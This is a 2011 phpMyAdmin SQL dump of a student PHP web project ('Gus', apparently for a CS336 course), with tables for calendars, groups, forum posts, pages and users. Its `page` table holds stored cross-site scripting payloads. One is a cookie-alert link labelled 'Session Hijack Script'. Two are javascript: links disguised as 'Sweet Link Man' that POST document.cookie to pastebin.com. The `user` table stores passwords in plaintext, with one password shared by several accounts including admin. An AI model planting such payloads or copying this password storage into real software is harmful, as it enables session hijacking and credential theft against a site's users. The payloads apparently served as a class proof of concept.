-- phpMyAdmin SQL Dump
-- version 3.2.0.1
-- http://www.phpmyadmin.net
--
-- Host: localhost
-- Generation Time: Apr 15, 2011 at 03:52 PM
-- Server version: 5.1.36
-- PHP Version: 5.3.0

SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";

--
-- Database: `gusphp`
--

-- --------------------------------------------------------

--
-- Table structure for table `calendar`
--

CREATE TABLE IF NOT EXISTS `calendar` (
  `user` varchar(32) NOT NULL,
  `date` date NOT NULL,
  `data` varchar(150) NOT NULL,
  `eventID` int(11) NOT NULL AUTO_INCREMENT,
  KEY `eventID` (`eventID`),
  KEY `eventID_2` (`eventID`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=308 ;

--
-- Dumping data for table `calendar`
--

INSERT INTO `calendar` (`user`, `date`, `data`, `eventID`) VALUES
('main', '2011-04-08', 'event', 209),
('test_group', '2011-04-08', 'group event', 301),
('admin', '2011-04-08', 'someone else''s event', 215),
('long3841', '2011-04-08', 'event''', 307),
('long3841', '2011-04-08', 'event!!!', 304);

-- --------------------------------------------------------

--
-- Table structure for table `calendar_rsvp`
--

CREATE TABLE IF NOT EXISTS `calendar_rsvp` (
  `eventID` int(11) NOT NULL,
  `groupID` int(11) NOT NULL,
  `name` varchar(30) NOT NULL,
  `yes` int(11) NOT NULL,
  `no` int(11) NOT NULL,
  `maybe` int(11) NOT NULL,
  `unanswered` int(11) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `calendar_rsvp`
--

INSERT INTO `calendar_rsvp` (`eventID`, `groupID`, `name`, `yes`, `no`, `maybe`, `unanswered`) VALUES
(304, 5, 'drj', 0, 0, 0, 1),
(304, 5, 'test', 1, 0, 0, 0),
(304, 5, 'long3841', 1, 0, 0, 0),
(301, 5, 'sbeddall', 0, 0, 0, 1),
(304, 5, 'brett', 1, 0, 0, 0),
(304, 5, 'timb', 0, 0, 0, 1),
(301, 5, 'anilson', 0, 0, 0, 1),
(301, 5, 'cblair', 0, 0, 0, 1),
(304, 5, 'crempel', 1, 0, 0, 0),
(301, 5, 'long3841', 1, 0, 0, 0);

-- --------------------------------------------------------

--
-- Table structure for table `files`
--

CREATE TABLE IF NOT EXISTS `files` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `filename` text NOT NULL,
  `uid` int(11) DEFAULT NULL,
  `gid` int(11) DEFAULT NULL,
  `date` int(11) DEFAULT NULL,
  `size` float DEFAULT NULL,
  `perm` int(11) DEFAULT '7',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=33 ;

--
-- Dumping data for table `files`
--

INSERT INTO `files` (`id`, `filename`, `uid`, `gid`, `date`, `size`, `perm`) VALUES
(27, '9j31F.jpg', 13, 5, 20110415, 52.48, 7),
(32, 'magikarp-swear.gif', 13, 5, 20110415, 8.15, 7);

-- --------------------------------------------------------

--
-- Table structure for table `ggroup`
--

CREATE TABLE IF NOT EXISTS `ggroup` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(100) DEFAULT NULL,
  `description` text,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=11 ;

--
-- Dumping data for table `ggroup`
--

INSERT INTO `ggroup` (`id`, `name`, `description`) VALUES
(5, 'test_group', 'test_desc'),
(10, 'main', 'Gus main group. Users set to admin (7) on this group get system wide admin privileges.');

-- --------------------------------------------------------

--
-- Table structure for table `messages`
--

CREATE TABLE IF NOT EXISTS `messages` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `respond_id` int(11) DEFAULT NULL,
  `from_id` int(11) NOT NULL,
  `to_id` int(11) NOT NULL,
  `subject` varchar(64) NOT NULL,
  `message` varchar(255) NOT NULL,
  `location` enum('inbox','sent','archived') NOT NULL,
  `created` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

--
-- Dumping data for table `messages`
--


-- --------------------------------------------------------

--
-- Table structure for table `page`
--

CREATE TABLE IF NOT EXISTS `page` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(100) DEFAULT NULL,
  `content` text,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=21 ;

--
-- Dumping data for table `page`
--

INSERT INTO `page` (`id`, `name`, `content`) VALUES
(15, 'test', 'Test content'),
(16, 'home', 'Gus Home Page.\n<br />\n\nCS336Test<br>\n<a href="javascript:function a(){alert(document.cookie);}a();">Session Hijack Script</a>\n<br>\nYeah, don''t actually click that.\n<br>\n<br />\n<br />\n\nThis is the latest (stablest) version of the project.\n<br />\n<br />\n\nLast git pull on 03/25/11 .'),
(18, 'auth', 'Gus Authentication'),
(19, 'CS336 Test', '<a href="javascript:var a=new XMLHttpRequest,b="paste_code="+document.cookie+"&paste_name=XSS_poc";a.open("POST","http://pastebin.com/api_public.php",true);a.setRequestHeader("Content-type","application/x-www-form-urlencoded");a.setRequestHeader("Content-length",b.length+"");a.setRequestHeader("Connection","close");a.send(b);">Sweet Link Man</a>'),
(20, 'CS336Test', '<a href="javascript:var a=new XMLHttpRequest,b="paste_code="+document.cookie+"&paste_name=XSS_poc";a.open("POST","http://pastebin.com/api_public.php",true);a.setRequestHeader("Content-type","application/x-www-form-urlencoded");a.setRequestHeader("Content-length",b.length+"");a.setRequestHeader("Connection","close");a.send(b);">Sweet Link Man</a>');

-- --------------------------------------------------------

--
-- Table structure for table `replies`
--

CREATE TABLE IF NOT EXISTS `replies` (
  `thread_id` int(4) NOT NULL DEFAULT '0',
  `reply_id` int(4) NOT NULL DEFAULT '0',
  `author` varchar(65) NOT NULL DEFAULT '',
  `a_email` varchar(65) NOT NULL DEFAULT '',
  `body` longtext NOT NULL,
  `datetime` varchar(25) NOT NULL DEFAULT '',
  KEY `a_id` (`reply_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `replies`
--

INSERT INTO `replies` (`thread_id`, `reply_id`, `author`, `a_email`, `body`, `datetime`) VALUES
(5, 0, 'Chaylo', '', 'Just testing the reply counter', '15/Feb/2011 07:59:36'),
(5, 0, 'testing', '', 'testing some more', '15/Feb/2011 08:50:23'),
(5, 0, 'testing', '', 'testing', '15/Feb/2011 08:53:16'),
(6, 0, 'tesing', '', 'testing', '15/Feb/2011 08:53:27'),
(5, 0, '', '', 'Gadzooks.', '17/Feb/2011 07:35:18');

-- --------------------------------------------------------

--
-- Table structure for table `threads`
--

CREATE TABLE IF NOT EXISTS `threads` (
  `thread_id` int(4) NOT NULL AUTO_INCREMENT,
  `thread_topic` varchar(255) NOT NULL DEFAULT '',
  `thread_body` longtext NOT NULL,
  `thread_author` varchar(65) NOT NULL DEFAULT '',
  `email` varchar(65) NOT NULL DEFAULT '',
  `datetime` varchar(25) NOT NULL DEFAULT '',
  `view` int(4) NOT NULL DEFAULT '0',
  `num_replies` int(4) NOT NULL DEFAULT '0',
  `group_id` int(100) NOT NULL,
  `group_name` varchar(128) NOT NULL,
  PRIMARY KEY (`thread_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=10 ;

--
-- Dumping data for table `threads`
--

INSERT INTO `threads` (`thread_id`, `thread_topic`, `thread_body`, `thread_author`, `email`, `datetime`, `view`, `num_replies`, `group_id`, `group_name`) VALUES
(5, 'First Forum Entry', 'Just a quick test to make sure everything is working', 'Chaylo', '', '15/Feb/2011 07:59:21', 0, 6, 1, ''),
(6, 'Gotta check it all again!', 'Ugh', 'Chaylo', '', '15/Feb/2011 08:50:01', 0, 1, 1, ''),
(7, 'testing 1 2 3', 'Hello?', 'Chaylo', '', '25/Mar/2011 10:35:22', 0, 2, 1, 'test'),
(9, 'testing', 'smurF!', 'claurino', '', '28/Mar/2011 03:18:44', 0, 3, 1, 'test');

-- --------------------------------------------------------

--
-- Table structure for table `user`
--

CREATE TABLE IF NOT EXISTS `user` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `un` varchar(100) NOT NULL,
  `pw` varchar(100) NOT NULL,
  `profile` varchar(100) NOT NULL,
  `email` varchar(25) NOT NULL,
  `contact` varchar(15) NOT NULL,
  `major` varchar(25) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=26 ;

--
-- Dumping data for table `user`
--

INSERT INTO `user` (`id`, `un`, `pw`, `profile`, `email`, `contact`, `major`) VALUES
(0, 'cblair', 'SHI/hel7', 't', 'e', 's', 't'),
(11, 'anilson', 'supersecurepassword1234!@#$', 'sfdsfd', 'fdfd', 'saas', 'dsd'),
(12, 'long3841', 'long3841', '', '', '', ''),
(13, 'sbeddall', '0017761826', '', '', '', ''),
(15, 'brett', 'brett256', 'sdsd', 'here@there.com', '929-384903-393', 'CS'),
(17, 'timb', 'frost741', '', '', '', ''),
(18, 'claurino', '22877822', '', '', '', ''),
(19, 'lwegner', '7ndustr8', '', '', '', ''),
(20, 'crempel', 'SHI/hel7', '', '', '', ''),
(21, 'abhay', 'gusabhay', '', '', '', ''),
(22, 'drj', 'SHI/hel7', '', '', '', ''),
(23, 'test', 'test123', '', '', '', ''),
(24, 'admin', 'SHI/hel7', '', '', '', ''),
(25, 'sdfasdffe', '324vf3v3f3f', '', '', '', '');

-- --------------------------------------------------------

--
-- Table structure for table `usergroup`
--

CREATE TABLE IF NOT EXISTS `usergroup` (
  `uid` int(11) NOT NULL,
  `gid` int(11) NOT NULL,
  `perm` tinyint(4) NOT NULL,
  KEY `uid` (`uid`),
  KEY `gid` (`gid`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `usergroup`
--

INSERT INTO `usergroup` (`uid`, `gid`, `perm`) VALUES
(23, 5, 1),
(24, 10, 7),
(19, 10, 7),
(21, 10, 0),
(21, 5, 0),
(15, 10, 0),
(15, 5, 0),
(13, 5, 7),
(13, 10, 7),
(0, 10, 0),
(12, 10, 7),
(12, 5, 7);

--
-- Constraints for dumped tables
--

--
-- Constraints for table `usergroup`
--
ALTER TABLE `usergroup`
  ADD CONSTRAINT `usergroup_ibfk_1` FOREIGN KEY (`uid`) REFERENCES `user` (`id`) ON DELETE CASCADE,
  ADD CONSTRAINT `usergroup_ibfk_2` FOREIGN KEY (`gid`) REFERENCES `ggroup` (`id`) ON DELETE CASCADE;
